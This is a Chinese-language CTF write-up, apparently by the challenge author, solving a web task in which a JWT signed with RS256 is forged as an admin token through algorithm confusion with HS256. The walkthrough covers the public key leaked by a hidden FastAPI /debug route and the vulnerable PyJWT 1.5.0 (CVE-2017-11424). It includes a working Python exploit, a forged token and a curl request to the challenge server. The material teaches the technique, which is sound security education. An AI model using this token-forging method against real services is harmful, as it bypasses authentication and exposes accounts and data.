# 普通的身份认证器

一道简单的 web 题，本来想出得更好一点的，但是因为时间不太够 + 自己太菜了，所以出成了现在这个样子。

## JWT

打开题目显示只能以 Guest 用户登录，获取用户信息提示需要 admin 用户才能看到 flag。看到登录可能大家的第一反应是去看 cookie，但是 cookie 里面什么都没有。如果去读与 Vue 相关的代码，就会发现……所谓的登录，实际上是：把比赛 token 放进 header 里面，然后 POST 方式请求 `/token`，将结果放进 `this.jwt` 里面。之后获取用户信息，就是把比赛 token 和 `this.jwt` 放进 header 里面，然后 GET 方式请求 `/profile`。

然后呢？看起来 JWT (JSON Web Tokens) 是一个关键的地方。通过观察开发者工具的 Network 模块，可以获得服务器发来的 JWT（当然，这道题加载的是开发版本的 Vue，所以如果你写过 Vue 的话，你的浏览器里也应该会有 Vue.js devtools，用那个应该会更方便一点）。

但是 JWT 是什么？简单（而可能不太准确）地说，JWT 是一种用于身份认证的 token，token 中的内容是公开的，通过签名保证 token 未被篡改。可以在 <https://jwt.io> 来解码得到的 token，以下是一个获取到的 token 的例子：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJndWVzdCIsImV4cCI6MTYwNDM3NDE4N30.ZADFKRFG0I5LpsUwb2hAqcyD1BOWf5doLrxVIuI-OINDPaBNKsuCPInxadxW5VbhDmmkcgBnGT_GQfqE7VWFKf2aY0Zfq8YNmXPESEWV9OC4WHfEt3GwN5B2Rt1wXZgcWuB9pcxVKttoND9yLS5Pa7mOTyc_SPJ-A7t0FnfoL8NwbqOeLorMW190UuVb4_bbuNcEVFwqOp6A7vrNLbD6trhUrk2aFG1rtbTwuTkdDqMozOtzI8GtwpShb9XmQCugjOBciQceeTnRB4PjBxdJO8tHuiVMwVIOg5__-gDJTDAxd9veT_T8finvvOJ2rMAsNO_WSOYgdBKBwfUh5kbh7x-C616dj4C0xnJR8U3DDhyyjBa5V6c9_jDWM6E0YB9O0iRTglWetvW3xC-_ZNaWS-yxFvcAnVxOVyEkAiow0BJuyRxNDXc3m2g0yg6vUjmimUnJ3-ffl5E1sqdPiK_Tyy2ny21ZRzZz01uEf0Z31JP3RThOKPmfkTDpRKMB5pSuCeqvxK5ZP6hKwpahc5MqZHbzwMv8rPD_D-bLDKjSkYfu_JCQO00mfTDxg28DWSvJz8xaUL3oUAsR_8lhw20SElh_NcdywMSiDTe6vYZ0KjRZ1mIZMLxmAqPR2YlhRwQmhGad5Z2EKHUTwaYzR_tI4HtubTk4L3k7PBo5N6T0WwY
```

解码之后可以看到，这个 JWT 的 header 提示我们它的类型 (`typ`) 是 JWT，签名算法 (`alg`) 是 `RS256`（使用 SHA-256 的 RSA 签名）；Payload 中标明了用户名 (`sub`) 为 `guest`，以及其过期时间 (`exp`) 为北京时间 2020 年 11 月 3 日 11:29:47；最后是签名部分，当然公钥和私钥我们现在都不知道。

下一步应该做什么呢？

## FastAPI

从注释中可以得到，它的后端框架使用的是 FastAPI，一个快速的 Python Web API 框架。如果真的去看过 [FastAPI 文档](https://fastapi.tiangolo.com/) 的话，你会发现 FastAPI 会给网站自动生成 API 文档，路径在 `/docs`。点开来查看之后，就能看到一个隐藏的 route `/debug`，访问一下，就能看到它把公钥吐出来了。

## ~~公钥被大家知道了也不会怎么样吧~~

在非对称密码中，公钥确实是可以公开的。但是这就牵扯到了 JWT 格式的问题：它的签名算法除了支持 RSA 签名以外，还支持对称的 HMAC 签名（例如 `HS256`），并且修改 JWT 中的签名算法只需要修改 header 的 `alg` 字段，并且通过某些方法，仍然让程序认为整个 JWT 是完好而未被篡改的即可。

在使用 RS256 时，程序的流程是：

- 使用私钥为 JWT 签名。
- 使用公钥验证接收到的 JWT 的完整性。

而在使用 HS256 时，程序的流程是：

- 使用密钥为 JWT 签名。
- 同样，使用这个密钥验证 JWT 的完整性。显然，这个密钥不能被泄露出来。

那么如果我们知道公钥，那么我们就能这么做：

- 接收到一个合法的，使用 `RS256` 签名算法的 JWT。
- 修改 JWT 的 payload 我们想要的样子，同时修改 header 的算法为 `HS256`。
- 使用已知的公钥，以 `HS256` 算法重新签名我们修改后的公钥。
- 发给服务器。此时，服务器使用公钥 + `HS256` 算法检查 JWT，发现没有问题，就会认为这是一个合法的 JWT。

目前的 JWT 库基本上都修复了这个问题。

## exp

题目中提到“只是他似乎没有仔细检查每一项依赖的版本”，暗示了网站可能使用了有问题的 JWT 库。Python 的 JWT 库有很多，这里挑选了 PyJWT 作为我们的 JWT 库（当然用别的也行），阅读文档之后很容易就能写出来：

```python
import jwt

PUBLIC_KEY = "-----BEGIN RSA PUBLIC KEY-----\nMIICCgKCAgEAn/KiHQ+/zwE7kY/Xf89PY6SowSb7CUk2b+lSVqC9u+R4BaE/5tNF\neNlneGNny6fQhCRA+Pdw1UJSnNpG26z/uOK8+H7fMb2Da5t/94wavw410sCKVbvf\nft8gKquUaeq//tp20BETeS5MWIXp5EXCE+lEdAHgmWWoMVMIOXwaKTMnCVGJ2SRr\n+xH9147FZqOa/17PYIIHuUDlfeGi+Iu7T6a+QZ0tvmHL6j9Onk/EEONuUDfElonY\nM688jhuAM/FSLfMzdyk23mJk3CKPah48nzVmb1YRyfBWiVFGYQqMCBnWgoGOanpd\n46Fp1ff1zBn4sZTfPSOus/+00D5Lxh6bsbRa6A1vAApfmTcu026lIb7gbG7DU1/s\neDId9s1qA5BJpzWFKO4ztkPGvPTUok8hQBMDaSH1JOoFQgfJIfC7w2CQe+KbodQL\n3akKQDCZhcoA4tf5VC6ODJpFxCn6blML5cD6veOBPJiIk8DBRgmt2AHzOUju+5ns\nQcplOVxW5TFYxLqeJ8FPWqQcVekZ749FjchtAwPlUsoWIH0PTSun38ua8usrwTXb\npBlf4r0wz22FPqaecvp7z6Rj/xfDauDGDSU4hmn/TY9Fr+OmFJPW/9k2RAv7KEFv\nFCLP/3U3r0FMwSe/FPHmt5fjAtsGlZLj+bZsgwFllYeD90VQU8Ds+KkCAwEAAQ==\n-----END RSA PUBLIC KEY-----\n"

payload = {
  "sub": "admin",
  "exp": 9602085613,  # fill in any number you like
}

encoded = jwt.encode(payload, PUBLIC_KEY, algorithm='HS256')

print(encoded)
```

但是如果直接运行的话，会报错。

```
Traceback (most recent call last):
  File "exp.py", line 10, in <module>
    encoded = jwt.encode(payload, PUBLIC_KEY, algorithm='HS256')
  File "<redacted>/venv/lib/python3.7/site-packages/jwt/api_jwt.py", line 65, in encode
    json_payload, key, algorithm, headers, json_encoder
  File "<redacted>/venv/lib/python3.7/site-packages/jwt/api_jws.py", line 113, in encode
    key = alg_obj.prepare_key(key)
  File "<redacted>/venv/lib/python3.7/site-packages/jwt/algorithms.py", line 151, in prepare_key
    'The specified key is an asymmetric key or x509 certificate and'
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```

这是因为，PyJWT（以及其他很多 JWT 库）修复这个安全漏洞的方式是：当使用 HS256 encode/decode 的时候，检查密钥的开头是否是非对称加密的公钥，如果是，就报错。可以直接魔改 jwt/algorithms.py 把这一部分的校验去掉，也可以降级到有问题的版本（1.5.0）然后再跑 exp。

获得的一个可用的 JWT 是：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTYwMjA4NTYxM30.2oxpg6KALSg37msshI8Oddi1TgspKdxoPzOJ0Zyt77I
```

然后请求 `/profile`:

```
curl -H 'Hg-Token: 你的 token' -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTYwMjA4NTYxM30.2oxpg6KALSg37msshI8Oddi1TgspKdxoPzOJ0Zyt77I' http://202.38.93.111:10092/profile
```

就好了。

## 题目细节

### 使用的 JWT 库版本

本题使用的是 PyJWT 1.5.0，对应的 CVE 是 [CVE-2017-11424](https://www.cvedetails.com/cve/CVE-2017-11424/)。其实 PyJWT 当时已经考虑到了本题所述的安全问题，但是[在进行校验的时候，没有把所有可能的情况都加入](https://github.com/jpadilla/pyjwt/blob/1.5.0/jwt/algorithms.py#L142)。

```python
invalid_strings = [
    b'-----BEGIN PUBLIC KEY-----',
    b'-----BEGIN CERTIFICATE-----',
    b'ssh-rsa'
]

if any([string_value in key for string_value in invalid_strings]):
    raise InvalidKeyError(
        'The specified key is an asymmetric key or x509 certificate and'
        ' should not be used as an HMAC secret.')
```

如果开头是 `-----BEGIN RSA PUBLIC KEY-----` 的话，就能通过这样的逻辑了。因为 FastAPI 是在 PyJWT 1.5.0 之后出现的（如果我没搞错的话），题目为了能够自圆其说……文案就写成了这样子。

### 可以把 algorithm 设置为 none 吗？

把 CTF 和 JWT 放在一起搜索过的同学一定能找到一些常见会出现的安全问题，包括本题使用的问题，以及将 algorithm 设置为 none 来绕过签名检查的问题。

但是本题中，这种做法是不可行的。因为尽管 PyJWT 支持 none，它在 encode/decode 的时候会检查参数中密钥是否被设置，[如果设置了就会报错](https://github.com/jpadilla/pyjwt/blob/1.5.0/jwt/algorithms.py#L116)，这是无法绕过的。